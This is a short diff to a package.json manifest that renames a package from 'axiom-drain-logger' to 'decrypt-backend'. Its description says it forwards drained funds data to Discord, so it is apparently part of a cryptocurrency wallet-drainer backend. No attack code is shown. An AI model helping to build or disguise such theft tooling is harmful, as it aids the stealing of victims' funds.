@@ -1,7 +1,7 @@
 {
-  "name": "axiom-drain-logger",
+  "name": "decrypt-backend",
   "version": "1.0.0",
-  "description": "Logs drained funds to Discord",
+  "description": "Decrypts and forwards drained funds data to Discord",
   "main": "index.js",
   "scripts": {
     "start": "node index.js"
